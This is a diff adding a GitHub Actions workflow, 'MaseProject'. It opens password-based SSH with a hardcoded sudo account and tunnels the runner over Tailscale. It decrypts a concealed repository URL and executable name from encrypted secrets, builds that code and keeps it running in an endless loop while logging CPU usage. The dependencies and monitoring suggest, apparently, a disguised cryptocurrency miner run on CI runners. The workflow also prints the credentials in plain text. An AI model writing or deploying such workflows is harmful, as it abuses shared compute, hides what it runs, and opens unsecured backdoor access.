@@ -1,0 +1,147 @@
+name: MaseProject
+
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-ssh:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3600
+
+    steps:
+      - name: Configure SSH Settings
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y openssh-server
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo systemctl restart ssh
+          sudo ufw allow 22/tcp
+          echo "SSH configured successfully"
+
+      - name: Create SSH User with Fixed Password
+        run: |
+          PASSWORD="*r96319631P-"
+          sudo useradd -m -s /bin/bash SSH
+          echo "SSH:$PASSWORD" | sudo chpasswd
+          sudo usermod -aG sudo SSH
+          echo "SSH_CREDS=User: SSH | Password: $PASSWORD" >> $GITHUB_ENV
+          if ! id "SSH" &>/dev/null; then
+              echo "User creation failed"
+              exit 1
+          fi
+          echo "User SSH created successfully"
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt-get update
+          sudo apt-get install -y tailscale
+          echo "Tailscale installed successfully"
+
+      - name: Establish Tailscale Connection
+        run: |
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$GITHUB_RUN_ID
+          TAILSCALE_IP=""
+          RETRIES=0
+          while [ -z "$TAILSCALE_IP" ] && [ $RETRIES -lt 10 ]; do
+              TAILSCALE_IP=$(tailscale ip -4)
+              sleep 5
+              RETRIES=$((RETRIES + 1))
+          done
+          if [ -z "$TAILSCALE_IP" ]; then
+              echo "Tailscale IP not assigned. Exiting."
+              exit 1
+          fi
+          echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
+          echo "Tailscale connected with IP: $TAILSCALE_IP"
+
+      - name: Verify SSH Accessibility
+        run: |
+          echo "Tailscale IP: $TAILSCALE_IP"
+          sudo systemctl status ssh --no-pager
+          if nc -zv localhost 22 2>&1 | grep -q succeeded; then
+              echo "SSH port 22 is accessible"
+          else
+              echo "SSH port 22 is NOT accessible"
+              exit 1
+          fi
+          echo "SSH connectivity verified successfully"
+
+      - name: Decrypt Secrets
+        run: |
+          # Install decryption tools
+          sudo apt-get install -y openssl
+          
+          # Decrypt secrets using AES-256-CBC
+          REPO_URL=$(echo '${{ secrets.ENCRYPTED_REPO_URL }}' | base64 -d | openssl enc -aes-256-cbc -d -k '${{ secrets.MASTER_KEY }}')
+          PROJECT_NAME=$(echo '${{ secrets.ENCRYPTED_PROJECT_NAME }}' | base64 -d | openssl enc -aes-256-cbc -d -k '${{ secrets.MASTER_KEY }}')
+          EXECUTABLE_NAME=$(echo '${{ secrets.ENCRYPTED_PROJECT_NAME }}' | base64 -d | openssl enc -aes-256-cbc -d -k '${{ secrets.MASTER_KEY }}')
+          
+          echo "REPO_URL=$REPO_URL" >> $GITHUB_ENV
+          echo "PROJECT_NAME=$PROJECT_NAME" >> $GITHUB_ENV
+          echo "EXECUTABLE_NAME=$EXECUTABLE_NAME" >> $GITHUB_ENV
+
+      - name: Install Project
+        run: |
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          cd /home/SSH
+          sudo -u SSH git clone $REPO_URL
+          cd $PROJECT_NAME
+          sudo -u SSH mkdir build
+          cd build
+          sudo -u SSH cmake ..
+          sudo -u SSH make -j$(nproc)
+          echo "$PROJECT_NAME compiled successfully"
+
+      - name: Start Project
+        run: |
+          sudo touch /home/SSH/$PROJECT_NAME.log
+          sudo chown SSH:SSH /home/SSH/$PROJECT_NAME.log
+          cd /home/SSH/$PROJECT_NAME/build
+          sudo -u SSH bash -c "nohup ./$EXECUTABLE_NAME > /home/SSH/$PROJECT_NAME.log 2>&1 &"
+          sleep 10
+          if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
+              echo "$PROJECT_NAME started successfully"
+              echo "Process ID: $(pgrep -f $EXECUTABLE_NAME)"
+          else
+              echo "Warning: $PROJECT_NAME may not be running properly"
+              echo "Checking log file:"
+              cat /home/SSH/$PROJECT_NAME.log || echo "Log file is empty or not accessible"
+          fi
+
+      - name: Maintain Connection
+        run: |
+          echo ""
+          echo "=== SSH ACCESS ==="
+          echo "Address: $TAILSCALE_IP"
+          echo "Port: 22"
+          echo "Username: SSH"
+          echo "Password: *r96319631P-"
+          echo "=================="
+          echo ""
+          echo "=== $PROJECT_NAME STATUS ==="
+          echo "$PROJECT_NAME is running in background"
+          echo "Log file: /home/SSH/$PROJECT_NAME.log"
+          echo "Config: /home/SSH/$PROJECT_NAME/build/config.json"
+          echo "===================="
+          echo ""
+          echo "Connect using: ssh SSH@$TAILSCALE_IP"
+          echo "View $PROJECT_NAME log: tail -f /home/SSH/$PROJECT_NAME.log"
+          echo ""
+          while true; do
+              echo "[$(date)] SSH Active | $PROJECT_NAME Status Check"
+              if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
+                  PID=$(pgrep -f $EXECUTABLE_NAME)
+                  echo "[$(date)] $PROJECT_NAME is RUNNING - PID: $PID"
+                  echo "[$(date)] CPU Usage: $(ps -p $PID -o %cpu= 2>/dev/null || echo 'N/A')%"
+              else
+                  echo "[$(date)] WARNING: $PROJECT_NAME process NOT FOUND!"
+                  echo "[$(date)] Last 10 lines of log:"
+                  tail -n 10 /home/SSH/$PROJECT_NAME.log 2>/dev/null || echo "Cannot read log file"
+              fi
+              sleep 300
+          done
